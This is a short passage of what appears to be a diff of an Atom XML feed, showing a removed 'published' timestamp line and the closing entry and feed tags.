-        <published>2026-07-30T14:44:06.000Z</published>
     </entry>
 </feed>
